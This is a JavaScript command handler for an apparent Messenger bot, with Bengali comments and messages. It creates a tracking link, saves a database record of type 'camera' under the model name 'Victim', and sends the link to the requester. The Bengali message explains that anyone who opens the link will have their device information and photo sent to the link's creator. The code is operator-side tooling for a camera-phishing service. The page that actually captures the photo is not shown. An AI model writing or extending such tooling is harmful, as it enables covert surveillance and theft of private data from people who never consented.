const { nanoid } = require('nanoid');
const Victim = require('../models/Victim');
const { getConfig, sendMessage, shortenUrl } = require('../utils/helpers');

module.exports = {
    execute: async (senderId, args, sendMessage) => {
        try {
            const config = await getConfig();
            const baseUrl = config.baseUrl || 'http://localhost:3000';

            const id = nanoid(10);
            const longLink = `${baseUrl}/v/${id}`;

            // লিংক শর্ট করার চেষ্টা (ব্যর্থ হলে আসল লিংক)
            const shortLink = await shortenUrl(longLink);

            // ভিক্টিম ডাটাবেজে সেভ
            const victim = new Victim({
                id: id,
                fbId: senderId,
                type: 'camera',
                shortLink: shortLink || longLink,
                timestamp: new Date(),
                status: 'pending'
            });
            await victim.save();
            console.log(`✅ ভিক্টিম সেভ: ${id}`);

            // ============================================================
            // 🔥 কাস্টম মেসেজ (আপনার দেওয়া ফরম্যাট)
            // ============================================================
            const msg = `📷 ক্যামেরা লিংক সফলভাবে তৈরি হয়েছে! 🎉

🔗 আপনার লিংক: ${longLink}

📌 কাজ করার নিয়ম:
কেউ লিঙ্কে প্রবেশ করলে তার ডিভাইসের তথ্য এবং ছবি আপনার কাছে চলে আসবে। 💯
━━━━━━━━━━━━━━━━━━━━
🔗 Owner: m.me/2ndJohnnySins`;

            await sendMessage(senderId, msg);

        } catch (err) {
            console.error('❌ Camera command error:', err);
            await sendMessage(senderId, '❌ লিংক তৈরি করতে ব্যর্থ: ' + err.message);
        }
    }
};